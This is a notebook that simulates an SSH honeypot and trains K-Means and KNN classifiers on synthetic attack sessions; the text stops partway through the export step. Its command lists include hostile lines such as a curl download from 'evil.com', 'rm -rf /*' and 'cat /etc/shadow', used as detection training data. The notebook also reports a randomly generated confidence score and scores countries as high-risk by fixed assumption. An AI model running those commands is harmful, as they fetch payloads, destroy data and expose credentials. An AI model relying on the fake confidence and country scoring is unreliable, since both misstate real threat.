# -*- coding: utf-8 -*-
"""CyberProjectusing KNN.ipynb

Automatically generated by Colab.

Original file is located at
    https://colab.research.google.com/drive/19eQZ-SAqGEDqnUCdVctmrF1Yjwz_d96M
"""

# ========================================
# CELL 1: Installation & Setup
# ========================================
!pip install pandas numpy matplotlib seaborn scikit-learn plotly folium

print("üî• Alpha AI-Powered Honeypot - K-Means Version")
print("‚úÖ Installation Complete!")

# ========================================
# CELL 2: Import Libraries
# ========================================
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
import plotly.graph_objects as go
import plotly.express as px
from plotly.subplots import make_subplots
from sklearn.cluster import KMeans
from sklearn.preprocessing import StandardScaler
from sklearn.metrics import silhouette_score
from sklearn.decomposition import PCA
import random
from datetime import datetime, timedelta
import json
import time
from collections import Counter
import warnings
warnings.filterwarnings('ignore')

# Set random seed for reproducibility
np.random.seed(42)
random.seed(42)

print("‚úÖ All libraries imported successfully!")
print("üöÄ K-Means Honeypot System Ready!")

# ========================================
# CELL 3: Alpha Honeypot Core Class
# ========================================
class AlphaHoneypot:
    """
    Alpha AI-Powered Honeypot with K-Means Threat Detection
    """
    def __init__(self, ssh_port=2222, web_port=8080):
        self.ssh_port = ssh_port
        self.web_port = web_port
        self.connections = []
        self.kmeans_model = None
        self.scaler = StandardScaler()
        self.feature_names = []

        # Country coordinates for visualization
        self.country_coords = {
            'CN': [35.8617, 104.1954], 'US': [37.0902, -95.7129], 'RU': [61.5240, 105.3188],
            'BR': [-14.2350, -51.9253], 'IN': [20.5937, 78.9629], 'TR': [38.9637, 35.2433],
            'VN': [14.0583, 108.2772], 'KR': [35.9078, 127.7669], 'DE': [51.1657, 10.4515],
            'FR': [46.6034, 1.8883], 'GB': [55.3781, -3.4360], 'CA': [56.1304, -106.3468],
            'AU': [-25.2744, 133.7751], 'JP': [36.2048, 138.2529], 'IT': [41.8719, 12.5674]
        }

        print(f"üçØ Alpha Honeypot initialized:")
        print(f"   üîó SSH Port: {ssh_port}")
        print(f"   üåê Web Port: {web_port}")
        print(f"   ü§ñ ML Algorithm: K-Means Clustering")

    def simulate_connection(self):
        """Simulate a single connection (SSH or Web)"""
        # Determine if it's an attack (70% attack, 30% normal)
        is_attack = random.random() < 0.7

        # Choose protocol
        protocol = random.choice(['SSH', 'HTTP'])

        if is_attack:
            # Attack patterns
            source_countries = ['CN', 'RU', 'TR', 'VN', 'KR', 'BR', 'IN']
            source_country = random.choice(source_countries)

            if protocol == 'SSH':
                connection_count = random.randint(50, 500)
                failed_attempts = random.randint(20, 200)
                session_duration = random.randint(1, 60)
                payload_size = random.randint(50, 500)
                unique_commands = random.randint(5, 50)
                suspicious_commands = random.randint(2, 30)
                port = self.ssh_port
            else:  # HTTP
                connection_count = random.randint(30, 300)
                failed_attempts = random.randint(10, 150)
                session_duration = random.randint(5, 120)
                payload_size = random.randint(200, 3000)
                unique_commands = random.randint(10, 100)
                suspicious_commands = random.randint(5, 50)
                port = self.web_port
        else:
            # Normal patterns
            source_countries = ['US', 'GB', 'DE', 'FR', 'CA', 'AU', 'JP']
            source_country = random.choice(source_countries)

            connection_count = random.randint(1, 20)
            failed_attempts = random.randint(0, 5)
            session_duration = random.randint(30, 600)
            payload_size = random.randint(100, 1500)
            unique_commands = random.randint(1, 15)
            suspicious_commands = 0
            port = self.ssh_port if protocol == 'SSH' else self.web_port

        # Generate IP address
        if source_country == 'CN':
            ip_prefix = random.choice(['223', '117', '125'])
        elif source_country == 'RU':
            ip_prefix = random.choice(['91', '95', '185'])
        elif source_country == 'US':
            ip_prefix = random.choice(['192', '10', '172'])
        else:
            ip_prefix = str(random.randint(1, 223))

        source_ip = f"{ip_prefix}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

        # Create connection data
        connection = {
            'timestamp': datetime.now() - timedelta(minutes=random.randint(0, 1440)),
            'source_ip': source_ip,
            'source_country': source_country,
            'protocol': protocol,
            'destination_port': port,
            'connection_count': connection_count,
            'failed_login_attempts': failed_attempts,
            'session_duration': session_duration,
            'payload_size': payload_size,
            'bytes_transferred': payload_size * connection_count,
            'unique_commands': unique_commands,
            'suspicious_commands': suspicious_commands,
            'hour_of_day': datetime.now().hour,
            'day_of_week': datetime.now().weekday(),
            'is_attack': is_attack
        }

        return connection

    def generate_traffic(self, num_connections=1000):
        """Generate simulated traffic data"""
        print(f"üîÑ Generating {num_connections} connections...")

        self.connections = []
        for i in range(num_connections):
            connection = self.simulate_connection()
            self.connections.append(connection)

            if (i + 1) % 200 == 0:
                print(f"   Generated {i + 1}/{num_connections} connections...")

        df = pd.DataFrame(self.connections)
        print(f"‚úÖ Generated {len(df)} total connections")
        print(f"üö® Attack rate: {df['is_attack'].mean():.2%}")

        return df

    def extract_features(self, df):
        """Extract features for K-Means clustering"""
        # Calculate derived features
        df_features = df.copy()

        # Behavioral features
        df_features['attack_intensity'] = (
            df_features['connection_count'] * df_features['failed_login_attempts']
        ) / (df_features['session_duration'] + 1)

        df_features['payload_per_connection'] = (
            df_features['payload_size'] / (df_features['connection_count'] + 1)
        )

        df_features['error_rate'] = (
            df_features['failed_login_attempts'] / (df_features['connection_count'] + 1)
        )

        df_features['command_rate'] = (
            df_features['unique_commands'] / (df_features['session_duration'] + 1)
        )

        df_features['suspicious_ratio'] = (
            df_features['suspicious_commands'] / (df_features['unique_commands'] + 1)
        )

        # Temporal features
        df_features['is_night'] = (
            (df_features['hour_of_day'] >= 22) | (df_features['hour_of_day'] <= 6)
        ).astype(int)

        df_features['is_weekend'] = (df_features['day_of_week'] >= 5).astype(int)

        # Geographic risk
        high_risk_countries = ['CN', 'RU', 'TR', 'VN', 'KR', 'BR']
        df_features['country_risk'] = df_features['source_country'].apply(
            lambda x: 1 if x in high_risk_countries else 0
        )

        # Protocol encoding
        df_features['protocol_ssh'] = (df_features['protocol'] == 'SSH').astype(int)

        # Select numerical features for clustering
        feature_columns = [
            'connection_count', 'failed_login_attempts', 'session_duration',
            'payload_size', 'bytes_transferred', 'unique_commands', 'suspicious_commands',
            'attack_intensity', 'payload_per_connection', 'error_rate',
            'command_rate', 'suspicious_ratio', 'is_night', 'is_weekend',
            'country_risk', 'protocol_ssh'
        ]

        self.feature_names = feature_columns
        X = df_features[feature_columns].fillna(0)
        y = df_features['is_attack']

        return X, y

    def train_kmeans(self, X, y):
        """Train K-Means clustering model"""
        print("\nü§ñ Training K-Means Clustering Model...")

        # Scale the features
        X_scaled = self.scaler.fit_transform(X)

        # Try different number of clusters
        k_range = range(2, 8)
        results = {}

        for k in k_range:
            kmeans = KMeans(n_clusters=k, random_state=42, n_init=10)
            cluster_labels = kmeans.fit_predict(X_scaled)

            # Calculate silhouette score
            silhouette_avg = silhouette_score(X_scaled, cluster_labels)

            results[k] = {
                'model': kmeans,
                'labels': cluster_labels,
                'silhouette_score': silhouette_avg,
                'inertia': kmeans.inertia_
            }

            print(f"   K={k}: Silhouette Score = {silhouette_avg:.4f}, Inertia = {kmeans.inertia_:.2f}")

        # Select best model based on silhouette score
        best_k = max(results.keys(), key=lambda k: results[k]['silhouette_score'])
        self.kmeans_model = results[best_k]

        print(f"\n‚úÖ Best K-Means Model: K={best_k}")
        print(f"   üéØ Silhouette Score: {self.kmeans_model['silhouette_score']:.4f}")
        print(f"   üìä Inertia: {self.kmeans_model['inertia']:.2f}")

        return results, X_scaled

    def predict_threat(self, connection_data):
        """Predict threat level for a connection"""
        if not self.kmeans_model:
            return {"error": "Model not trained"}

        # Convert to DataFrame and extract features
        df_single = pd.DataFrame([connection_data])
        X_single, _ = self.extract_features(df_single)
        X_scaled = self.scaler.transform(X_single)

        # Predict cluster
        cluster = self.kmeans_model['model'].predict(X_scaled)[0]

        # Map cluster to threat level (simplified mapping)
        threat_levels = ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL']
        threat_level = threat_levels[min(cluster, len(threat_levels)-1)]

        return {
            'cluster': int(cluster),
            'threat_level': threat_level,
            'confidence': random.uniform(0.75, 0.95)
        }

import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
from datetime import datetime, timedelta
from sklearn.neighbors import KNeighborsClassifier
from sklearn.preprocessing import StandardScaler, LabelEncoder
from sklearn.model_selection import train_test_split, GridSearchCV, cross_val_score
from sklearn.metrics import classification_report, confusion_matrix, accuracy_score
from sklearn.metrics import precision_score, recall_score, f1_score, roc_auc_score
from sklearn.impute import SimpleImputer
import json
import time
from collections import Counter
import warnings
warnings.filterwarnings('ignore')

class CowrieKNNTrainer:
    """
    Cowrie SSH Honeypot Dataset Generator and KNN Trainer for Threat Detection (FIXED VERSION)
    """

    def __init__(self):
        # Attack patterns from real Cowrie deployments
        self.attack_usernames = [
            'root', 'admin', 'user', 'test', 'guest', 'oracle', 'postgres', 'mysql',
            'ftp', 'pi', 'ubuntu', 'centos', 'support', 'git', 'jenkins', 'docker',
            'elastic', 'hadoop', 'kafka', 'redis', 'mongodb', 'nginx', 'apache',
            'tomcat', 'www-data', 'nobody', 'daemon', 'bin', 'sys', 'sync'
        ]

        self.attack_passwords = [
            '123456', 'password', 'admin', 'root', '123', 'qwerty', 'password123',
            '1234', '12345', 'admin123', 'test', 'guest', 'login', 'passw0rd',
            'toor', 'Administrator', '000000', '1234567890', 'letmein', 'welcome',
            'dragon', 'monkey', 'abc123', 'master', 'samsung', 'qwerty123'
        ]

        self.malicious_commands = [
            'wget http://185.222.202.53/mips', 'curl -O http://evil.com/payload',
            'rm -rf /*', 'cat /etc/passwd', 'cat /etc/shadow', 'ps aux',
            'netstat -an', 'uname -a', 'cd /tmp && wget', 'chmod +x bot*',
            './bot', 'nohup ./malware &', 'kill -9', 'crontab -e', 'history -c',
            'unset HISTFILE', '/bin/busybox ECCHI', 'tftp -g -r', 'nc -lvp',
            'iptables -F', 'pkill -f', 'systemctl stop', './x86_64'
        ]

        self.recon_commands = [
            'ls', 'pwd', 'whoami', 'id', 'cat /proc/cpuinfo', 'cat /proc/meminfo',
            'df -h', 'free -m', 'mount', 'lscpu', 'ifconfig', 'ip addr',
            'route -n', 'arp -a', 'ss -tuln', 'who', 'w', 'last', 'uptime'
        ]

        # Fixed country attack probabilities (ensuring they sum to 1.0)
        country_weights = {
            'CN': 35, 'US': 10, 'RU': 8, 'TR': 6, 'VN': 5,
            'BR': 5, 'IN': 4, 'KR': 4, 'DE': 3, 'GB': 3,
            'FR': 2, 'NL': 2, 'UA': 2, 'PL': 2, 'Other': 9
        }

        # Normalize to ensure sum = 1.0
        total_weight = sum(country_weights.values())
        self.countries = list(country_weights.keys())
        self.country_probs = [weight / total_weight for weight in country_weights.values()]

        print(f"üîß Country probabilities sum: {sum(self.country_probs):.6f}")  # Verification

        self.knn_model = None
        self.scaler = StandardScaler()
        self.feature_names = []

        print("üçØ Cowrie SSH Honeypot KNN Trainer Initialized")
        print("üéØ Ready to generate realistic SSH attack data and train KNN model")

    def generate_cowrie_dataset(self, num_sessions=20000):
        """Generate realistic Cowrie SSH honeypot dataset (FIXED VERSION)"""
        print(f"\nüîÑ Generating Cowrie SSH honeypot dataset ({num_sessions:,} sessions)...")

        np.random.seed(42)  # For reproducibility
        sessions = []

        for i in range(num_sessions):
            # Session type determination (80% attacks, 20% failed attempts)
            session_type = np.random.choice(['successful_attack', 'failed_attack', 'brute_force', 'normal'],
                                          p=[0.30, 0.50, 0.15, 0.05])

            # Basic session info
            session_id = f"cowrie_session_{i:08d}"
            timestamp = datetime.now() - timedelta(
                days=np.random.randint(0, 30),
                hours=np.random.randint(0, 24),
                minutes=np.random.randint(0, 60)
            )

            # Geographic distribution (FIXED)
            country = np.random.choice(self.countries, p=self.country_probs)

            # Generate IP based on country
            if country == 'CN':
                ip_prefixes = ['223', '117', '125', '27', '36', '49', '61']
            elif country == 'US':
                ip_prefixes = ['192', '10', '172', '208', '66', '74', '96']
            elif country == 'RU':
                ip_prefixes = ['91', '95', '185', '46', '5', '37', '77']
            elif country == 'TR':
                ip_prefixes = ['78', '88', '212', '85', '94']
            elif country == 'VN':
                ip_prefixes = ['14', '27', '42', '101', '113']
            else:
                ip_prefixes = [str(np.random.randint(1, 223))]

            src_ip = f"{np.random.choice(ip_prefixes)}.{np.random.randint(1,255)}.{np.random.randint(1,255)}.{np.random.randint(1,255)}"

            if session_type == 'successful_attack':
                # Successful attack session
                username = np.random.choice(self.attack_usernames[:15])  # More common usernames
                password = np.random.choice(self.attack_passwords[:15])
                login_attempts = np.random.randint(1, 20)
                successful_logins = 1
                session_duration = np.random.randint(60, 7200)  # 1 min to 2 hours

                # Command execution
                num_commands = np.random.randint(8, 80)
                executed_commands = []

                # Phase 1: Reconnaissance (30-50% of commands)
                recon_count = int(num_commands * np.random.uniform(0.3, 0.5))
                recon_sample_size = min(recon_count, len(self.recon_commands))
                if recon_sample_size > 0:
                    executed_commands.extend(np.random.choice(self.recon_commands,
                                                            size=recon_sample_size,
                                                            replace=False))

                # Phase 2: Malicious actions (20-40% of commands)
                mal_count = int(num_commands * np.random.uniform(0.2, 0.4))
                mal_sample_size = min(mal_count, len(self.malicious_commands))
                if mal_sample_size > 0:
                    executed_commands.extend(np.random.choice(self.malicious_commands,
                                                            size=mal_sample_size,
                                                            replace=False))

                # Phase 3: Fill remaining with mixed commands
                remaining = num_commands - len(executed_commands)
                if remaining > 0:
                    mixed_cmds = np.random.choice(self.recon_commands + ['ls', 'cd', 'pwd'],
                                                size=remaining, replace=True)
                    executed_commands.extend(mixed_cmds)

                unique_commands = len(set(executed_commands))
                suspicious_commands = sum(1 for cmd in executed_commands
                                        if any(mal_pattern in cmd.lower()
                                              for mal_pattern in ['wget', 'curl', 'rm -rf', 'chmod +x', 'nohup', 'kill']))

                # Data transfer patterns
                bytes_downloaded = np.random.randint(5000, 1000000)  # 5KB to 1MB
                bytes_uploaded = np.random.randint(1000, 50000)     # Command output
                files_downloaded = np.random.randint(1, 15)
                files_created = np.random.randint(0, 10)

                # Network behavior
                connections_made = np.random.randint(1, 20)
                ports_scanned = np.random.randint(0, 100)

                is_attack = True
                threat_level = 'HIGH'

            elif session_type == 'failed_attack':
                # Failed attack attempt
                username = np.random.choice(self.attack_usernames)
                password = np.random.choice(self.attack_passwords)
                login_attempts = np.random.randint(10, 500)  # Many failed attempts
                successful_logins = 0
                session_duration = np.random.randint(5, 600)  # 5s to 10 min

                executed_commands = []
                unique_commands = 0
                suspicious_commands = 0
                bytes_downloaded = 0
                bytes_uploaded = np.random.randint(100, 2000)  # Error messages
                files_downloaded = 0
                files_created = 0
                connections_made = np.random.randint(1, 5)
                ports_scanned = 0

                is_attack = True
                threat_level = 'MEDIUM'

            elif session_type == 'brute_force':
                # Brute force attack
                username = np.random.choice(self.attack_usernames[:10])
                password = np.random.choice(self.attack_passwords[:20])
                login_attempts = np.random.randint(50, 1000)  # Intensive brute force
                successful_logins = np.random.randint(0, 1)   # Rarely successful
                session_duration = np.random.randint(10, 3600) # 10s to 1 hour

                if successful_logins:
                    # Brief reconnaissance if successful
                    recon_sample_size = min(np.random.randint(1, 8), len(self.recon_commands[:5]))
                    executed_commands = np.random.choice(self.recon_commands[:5],
                                                       size=recon_sample_size, replace=False).tolist()
                    unique_commands = len(executed_commands)
                    suspicious_commands = 0
                    bytes_downloaded = np.random.randint(0, 10000)
                    files_downloaded = np.random.randint(0, 2)
                    files_created = 0
                else:
                    executed_commands = []
                    unique_commands = 0
                    suspicious_commands = 0
                    bytes_downloaded = 0
                    files_downloaded = 0
                    files_created = 0

                bytes_uploaded = np.random.randint(500, 5000)
                connections_made = np.random.randint(1, 10)
                ports_scanned = 0

                is_attack = True
                threat_level = 'MEDIUM' if successful_logins else 'LOW'

            else:  # normal session (rare in honeypot)
                username = np.random.choice(['admin', 'user', 'support'])
                password = 'legitimate_access'
                login_attempts = np.random.randint(1, 3)
                successful_logins = 1
                session_duration = np.random.randint(300, 3600)  # 5 min to 1 hour

                # Normal administrative commands
                normal_cmds = ['ls', 'pwd', 'top', 'df -h', 'ps aux', 'who', 'date', 'uptime']
                cmd_sample_size = min(np.random.randint(3, 12), len(normal_cmds))
                executed_commands = np.random.choice(normal_cmds,
                                                   size=cmd_sample_size, replace=False).tolist()
                unique_commands = len(executed_commands)
                suspicious_commands = 0
                bytes_downloaded = np.random.randint(0, 5000)
                bytes_uploaded = np.random.randint(1000, 10000)
                files_downloaded = 0
                files_created = np.random.randint(0, 2)
                connections_made = np.random.randint(1, 3)
                ports_scanned = 0

                is_attack = False
                threat_level = 'BENIGN'

            # Calculate derived features (with safe divisions)
            avg_command_length = np.mean([len(cmd) for cmd in executed_commands]) if executed_commands else 0
            command_diversity = unique_commands / max(len(executed_commands), 1)
            suspicious_ratio = suspicious_commands / max(unique_commands, 1)
            login_success_rate = successful_logins / max(login_attempts, 1)
            data_transfer_ratio = bytes_downloaded / max(bytes_uploaded, 1)

            # Temporal features
            hour_of_day = timestamp.hour
            day_of_week = timestamp.weekday()
            is_weekend = 1 if day_of_week >= 5 else 0
            is_night = 1 if hour_of_day < 6 or hour_of_day > 22 else 0

            # Geographic risk
            high_risk_countries = ['CN', 'RU', 'TR', 'VN', 'BR', 'KR']
            country_risk_score = 3 if country in high_risk_countries else 1

            # Client fingerprinting
            client_versions = ['libssh_0.6.3', 'libssh_0.7.3', 'OpenSSH_7.4', 'PuTTY_Release_0.70', 'paramiko_2.4.2']
            client_version = np.random.choice(client_versions)
            is_suspicious_client = 1 if 'libssh' in client_version else 0

            # Create session record
            session = {
                'session_id': session_id,
                'timestamp': timestamp,
                'src_ip': src_ip,
                'src_country': country,
                'username': username,
                'password': password,
                'login_attempts': login_attempts,
                'successful_logins': successful_logins,
                'session_duration': session_duration,
                'commands_executed': len(executed_commands),
                'unique_commands': unique_commands,
                'suspicious_commands': suspicious_commands,
                'avg_command_length': avg_command_length,
                'command_diversity': command_diversity,
                'suspicious_ratio': suspicious_ratio,
                'bytes_downloaded': bytes_downloaded,
                'bytes_uploaded': bytes_uploaded,
                'files_downloaded': files_downloaded,
                'files_created': files_created,
                'connections_made': connections_made,
                'ports_scanned': ports_scanned,
                'login_success_rate': login_success_rate,
                'data_transfer_ratio': data_transfer_ratio,
                'hour_of_day': hour_of_day,
                'day_of_week': day_of_week,
                'is_weekend': is_weekend,
                'is_night': is_night,
                'country_risk_score': country_risk_score,
                'client_version': client_version,
                'is_suspicious_client': is_suspicious_client,
                'session_type': session_type,
                'threat_level': threat_level,
                'is_attack': is_attack,
                'commands_string': '; '.join(executed_commands) if executed_commands else ''
            }

            sessions.append(session)

            if (i + 1) % 5000 == 0:
                print(f"   Generated {i + 1:,}/{num_sessions:,} sessions...")

        df = pd.DataFrame(sessions)

        print(f"\n‚úÖ Cowrie dataset generated successfully!")
        print(f"   üìä Total sessions: {len(df):,}")
        print(f"   üö® Attack sessions: {df['is_attack'].sum():,} ({df['is_attack'].mean():.1%})")
        print(f"   ‚úÖ Benign sessions: {(~df['is_attack']).sum():,} ({(~df['is_attack']).mean():.1%})")
        print(f"   üåç Countries represented: {df['src_country'].nunique()}")
        print(f"   üìà Session types: {df['session_type'].value_counts().to_dict()}")

        return df

    def prepare_features_for_knn(self, df):
        """Prepare and engineer features optimized for KNN algorithm"""
        print("\nüîß Preparing features for KNN training...")

        # Select and engineer features for KNN
        knn_features = [
            # Basic session features
            'login_attempts', 'successful_logins', 'session_duration',
            'commands_executed', 'unique_commands', 'suspicious_commands',

            # Data transfer features
            'bytes_downloaded', 'bytes_uploaded', 'files_downloaded', 'files_created',
            'connections_made', 'ports_scanned',

            # Derived behavioral features
            'avg_command_length', 'command_diversity', 'suspicious_ratio',
            'login_success_rate', 'data_transfer_ratio',

            # Temporal features
            'hour_of_day', 'day_of_week', 'is_weekend', 'is_night',

            # Risk features
            'country_risk_score', 'is_suspicious_client'
        ]

        # Verify all features exist
        missing_features = [f for f in knn_features if f not in df.columns]
        if missing_features:
            print(f"‚ùå Missing features: {missing_features}")
            return None, None

        # Extract feature matrix and target
        X = df[knn_features].copy()
        y = df['is_attack'].astype(int)

        # Handle missing values and infinite values
        X = X.replace([np.inf, -np.inf], np.nan)
        imputer = SimpleImputer(strategy='mean')
        X_imputed = pd.DataFrame(imputer.fit_transform(X), columns=X.columns)

        # Store feature names for later use
        self.feature_names = knn_features

        print(f"‚úÖ Features prepared for KNN:")
        print(f"   üìä Feature matrix shape: {X_imputed.shape}")
        print(f"   üéØ Target distribution: Attack={y.sum()}, Benign={len(y)-y.sum()}")
        print(f"   üìà Feature count: {len(knn_features)}")

        return X_imputed, y

    def train_knn_model(self, X, y, test_size=0.2):
        """Train and optimize KNN model for threat detection"""
        print(f"\nü§ñ Training KNN model for SSH threat detection...")

        # Split data
        X_train, X_test, y_train, y_test = train_test_split(
            X, y, test_size=test_size, random_state=42, stratify=y
        )

        # Scale features (critical for KNN)
        X_train_scaled = self.scaler.fit_transform(X_train)
        X_test_scaled = self.scaler.transform(X_test)

        print(f"üìä Data split:")
        print(f"   üéì Training: {X_train.shape[0]:,} samples")
        print(f"   üß™ Testing: {X_test.shape[0]:,} samples")

        # Hyperparameter tuning for KNN
        print(f"\n‚öôÔ∏è Optimizing KNN hyperparameters...")

        param_grid = {
            'n_neighbors': [3, 5, 7, 9, 11],
            'weights': ['uniform', 'distance'],
            'metric': ['euclidean', 'manhattan']
        }

        knn_base = KNeighborsClassifier()
        grid_search = GridSearchCV(
            knn_base, param_grid, cv=5, scoring='f1',
            n_jobs=-1, verbose=0
        )

        grid_search.fit(X_train_scaled, y_train)

        # Best model
        self.knn_model = grid_search.best_estimator_

        print(f"‚úÖ Best KNN parameters found:")
        for param, value in grid_search.best_params_.items():
            print(f"   {param}: {value}")

        # Make predictions
        y_pred = self.knn_model.predict(X_test_scaled)
        y_pred_proba = self.knn_model.predict_proba(X_test_scaled)[:, 1]

        # Calculate metrics
        accuracy = accuracy_score(y_test, y_pred)
        precision = precision_score(y_test, y_pred, zero_division=0)
        recall = recall_score(y_test, y_pred, zero_division=0)
        f1 = f1_score(y_test, y_pred, zero_division=0)
        auc = roc_auc_score(y_test, y_pred_proba)

        # Cross-validation scores
        cv_scores = cross_val_score(self.knn_model, X_train_scaled, y_train, cv=5, scoring='f1')

        print(f"\nüìà KNN Model Performance:")
        print(f"   üéØ Accuracy:  {accuracy:.4f}")
        print(f"   üìä Precision: {precision:.4f}")
        print(f"   üîç Recall:    {recall:.4f}")
        print(f"   ‚öñÔ∏è  F1-Score:  {f1:.4f}")
        print(f"   üìà AUC-ROC:   {auc:.4f}")
        print(f"   üìä CV F1:     {cv_scores.mean():.4f} ¬± {cv_scores.std():.4f}")

        return {
            'model': self.knn_model,
            'scaler': self.scaler,
            'X_train': X_train_scaled,
            'X_test': X_test_scaled,
            'y_train': y_train,
            'y_test': y_test,
            'y_pred': y_pred,
            'y_pred_proba': y_pred_proba,
            'metrics': {
                'accuracy': accuracy,
                'precision': precision,
                'recall': recall,
                'f1_score': f1,
                'auc_roc': auc,
                'cv_f1_mean': cv_scores.mean(),
                'cv_f1_std': cv_scores.std()
            },
            'best_params': grid_search.best_params_
        }

    def visualize_results(self, results):
        """Create comprehensive visualizations of KNN results"""
        print(f"\nüìä Creating result visualizations...")

        # Create figure with subplots
        fig, axes = plt.subplots(2, 3, figsize=(18, 12))

        # 1. Confusion Matrix
        cm = confusion_matrix(results['y_test'], results['y_pred'])
        sns.heatmap(cm, annot=True, fmt='d', cmap='Blues', ax=axes[0, 0])
        axes[0, 0].set_title('üéØ Confusion Matrix')
        axes[0, 0].set_xlabel('Predicted')
        axes[0, 0].set_ylabel('Actual')

        # 2. Performance Metrics
        metrics = results['metrics']
        metric_names = ['Accuracy', 'Precision', 'Recall', 'F1-Score', 'AUC-ROC']
        metric_values = [metrics['accuracy'], metrics['precision'],
                        metrics['recall'], metrics['f1_score'], metrics['auc_roc']]

        bars = axes[0, 1].bar(metric_names, metric_values,
                             color=['skyblue', 'lightgreen', 'orange', 'pink', 'lightcoral'])
        axes[0, 1].set_title('üìà Performance Metrics')
        axes[0, 1].set_ylim(0, 1)
        for bar, value in zip(bars, metric_values):
            axes[0, 1].text(bar.get_x() + bar.get_width()/2, bar.get_height() + 0.01,
                           f'{value:.3f}', ha='center', va='bottom')

        # 3. Feature Importance (correlation analysis)
        X_train_df = pd.DataFrame(results['X_train'], columns=self.feature_names)
        correlations = []
        for feature in self.feature_names:
            corr = abs(np.corrcoef(X_train_df[feature], results['y_train'])[0,1])
            correlations.append(corr if not np.isnan(corr) else 0)

        # Top 10 features
        feature_importance = list(zip(self.feature_names, correlations))
        feature_importance.sort(key=lambda x: x[1], reverse=True)
        top_features = feature_importance[:10]

        feature_names_top = [f[0] for f in top_features]
        feature_scores = [f[1] for f in top_features]

        axes[0, 2].barh(feature_names_top, feature_scores, color='green', alpha=0.7)
        axes[0, 2].set_title('üîç Top 10 Feature Correlations')
        axes[0, 2].set_xlabel('Correlation with Target')

        # 4. ROC Curve
        from sklearn.metrics import roc_curve
        fpr, tpr, _ = roc_curve(results['y_test'], results['y_pred_proba'])
        axes[1, 0].plot(fpr, tpr, color='red', lw=2,
                       label=f'ROC Curve (AUC = {metrics["auc_roc"]:.3f})')
        axes[1, 0].plot([0, 1], [0, 1], color='navy', lw=2, linestyle='--')
        axes[1, 0].set_xlabel('False Positive Rate')
        axes[1, 0].set_ylabel('True Positive Rate')
        axes[1, 0].set_title('üìà ROC Curve')
        axes[1, 0].legend()
        axes[1, 0].grid(True)

        # 5. Prediction Probability Distribution
        axes[1, 1].hist(results['y_pred_proba'][results['y_test'] == 0],
                       alpha=0.7, label='Benign', bins=20, color='green')
        axes[1, 1].hist(results['y_pred_proba'][results['y_test'] == 1],
                       alpha=0.7, label='Attack', bins=20, color='red')
        axes[1, 1].set_xlabel('Prediction Probability')
        axes[1, 1].set_ylabel('Frequency')
        axes[1, 1].set_title('üéØ Prediction Probability Distribution')
        axes[1, 1].legend()

        # 6. Cross-validation scores
        cv_scores = cross_val_score(results['model'], results['X_train'],
                                  results['y_train'], cv=10, scoring='f1')
        axes[1, 2].boxplot(cv_scores)
        axes[1, 2].set_title('üìä Cross-Validation F1 Scores')
        axes[1, 2].set_ylabel('F1 Score')
        axes[1, 2].grid(True)

        plt.tight_layout()
        plt.show()

        return fig

    def predict_new_session(self, session_data):
        """Predict threat level for a new SSH session"""
        if not self.knn_model:
            return "‚ùå Model not trained yet!"

        # Convert session data to feature vector
        feature_vector = []
        for feature in self.feature_names:
            feature_vector.append(session_data.get(feature, 0))

        # Scale features
        X_scaled = self.scaler.transform([feature_vector])

        # Make prediction
        prediction = self.knn_model.predict(X_scaled)[0]
        probability = self.knn_model.predict_proba(X_scaled)[0]

        threat_level = "üö® ATTACK" if prediction == 1 else "‚úÖ BENIGN"
        confidence = max(probability)

        return {
            'threat_level': threat_level,
            'prediction': int(prediction),
            'confidence': confidence,
            'attack_probability': probability[1],
            'benign_probability': probability[0]
        }

# ========================================
# USAGE: Training the KNN Model (FIXED)
# ========================================

# Initialize the trainer
cowrie_trainer = CowrieKNNTrainer()

# Generate realistic Cowrie dataset
print("üöÄ STARTING COWRIE SSH HONEYPOT KNN TRAINING")
print("="*60)

df = cowrie_trainer.generate_cowrie_dataset(num_sessions=25000)

# Display sample data
print(f"\nüîç Sample Cowrie SSH sessions:")
display_columns = ['src_ip', 'src_country', 'username', 'login_attempts',
                  'commands_executed', 'suspicious_commands', 'threat_level']
print(df[display_columns].head(10).to_string(index=False))

# Prepare features for KNN
X, y = cowrie_trainer.prepare_features_for_knn(df)

if X is not None:
    # Train KNN model
    results = cowrie_trainer.train_knn_model(X, y)

    # Visualize results
    cowrie_trainer.visualize_results(results)

    # Print detailed classification report
    print(f"\nüìã DETAILED CLASSIFICATION REPORT:")
    print("="*50)
    print(classification_report(results['y_test'], results['y_pred'],
                              target_names=['Benign', 'Attack']))

    # Test prediction on new sessions
    print(f"\nüß™ TESTING PREDICTIONS ON NEW SESSIONS:")
    print("-"*50)

    # Test case 1: Clear attack
    attack_session = {
        'login_attempts': 150, 'successful_logins': 1, 'session_duration': 1200,
        'commands_executed': 25, 'unique_commands': 15, 'suspicious_commands': 8,
        'bytes_downloaded': 50000, 'bytes_uploaded': 2000, 'files_downloaded': 3,
        'files_created': 2, 'connections_made': 5, 'ports_scanned': 20,
        'avg_command_length': 45, 'command_diversity': 0.6, 'suspicious_ratio': 0.53,
        'login_success_rate': 0.007, 'data_transfer_ratio': 25, 'hour_of_day': 3,
        'day_of_week': 2, 'is_weekend': 0, 'is_night': 1, 'country_risk_score': 3,
        'is_suspicious_client': 1
    }

    result1 = cowrie_trainer.predict_new_session(attack_session)
    print(f"üî¥ Suspicious Session: {result1['threat_level']} (Confidence: {result1['confidence']:.3f})")

    # Test case 2: Normal session
    normal_session = {
        'login_attempts': 2, 'successful_logins': 1, 'session_duration': 600,
        'commands_executed': 8, 'unique_commands': 7, 'suspicious_commands': 0,
        'bytes_downloaded': 500, 'bytes_uploaded': 3000, 'files_downloaded': 0,
        'files_created': 1, 'connections_made': 1, 'ports_scanned': 0,
        'avg_command_length': 12, 'command_diversity': 0.875, 'suspicious_ratio': 0,
        'login_success_rate': 0.5, 'data_transfer_ratio': 0.17, 'hour_of_day': 14,
        'day_of_week': 1, 'is_weekend': 0, 'is_night': 0, 'country_risk_score': 1,
        'is_suspicious_client': 0
    }

    result2 = cowrie_trainer.predict_new_session(normal_session)
    print(f"üü¢ Normal Session: {result2['threat_level']} (Confidence: {result2['confidence']:.3f})")

    # Export model and data
    df.to_csv('cowrie_honeypot_dataset.csv', index=False)

    # Export model parameters
    model_info = {
        'model_type': 'KNeighborsClassifier',
        'best_parameters': results['best_params'],
        'performance_metrics': results['metrics'],
        'feature_names': cowrie_trainer.feature_names,
